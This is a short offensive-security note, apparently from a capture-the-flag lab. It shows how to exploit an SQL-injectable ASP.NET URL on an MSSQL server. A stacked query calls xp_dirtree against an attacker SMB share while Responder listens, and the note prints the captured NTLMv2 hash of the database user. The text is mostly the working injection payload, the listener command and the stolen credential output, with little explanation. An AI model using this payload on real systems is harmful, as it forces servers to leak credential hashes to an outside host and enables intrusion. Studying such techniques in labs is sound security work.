# SQLi & NTLM Hash Theft with xp_dirtree

---

## Example

An URL is vulnerable to SQLi, the server is an running windows server, which means MSSQL is in place.

```
http://10.129.96.140/mvc/Product.aspx?ProductSubCategoryId=18
```

## PoC

We can utilize an xp_dirtree sql query to get an call back to our smb listener, to steal the NTLM Hash of the database user.

1. Let's setup the listener.

```
responder -I tun0
```

2. Since we now have an listener running, we can access it through running an query inside mssql called "xp_dirtree".

```
http://10.129.96.140/mvc/Product.aspx?ProductSubCategoryId=18; EXEC MASTER.sys.xp_dirtree '\\10.10.14.161\hack'
```

Retrieved Credentials of the user "Stacy".

```
[SMB] NTLMv2-SSP Client   : 10.129.96.140
[SMB] NTLMv2-SSP Username : GIDDY\Stacy
[SMB] NTLMv2-SSP Hash     : Stacy::GIDDY:152fc7b285a0970a:B4C8D3A97FFDB3E0DF897972A38533B4:010100000000000080C1AC456281DC01455A6C9F04F0071A00000000020008004D0049003300390001001E00570049004E002D0059004C00590057004A0043005200460044005300370004003400570049004E002D0059004C00590057004A004300520046004400530037002E004D004900330039002E004C004F00430041004C00030014004D004900330039002E004C004F00430041004C00050014004D004900330039002E004C004F00430041004C000700080080C1AC456281DC01060004000200000008003000300000000000000000000000003000008CB89C771B8E7738C7FA30C266AAD3236D792E141FE3C04F5F220AA9F47F41410A001000000000000000000000000000000000000900220063006900660073002F00310030002E00310030002E00310034002E00310036003100000000000000000000000000
```
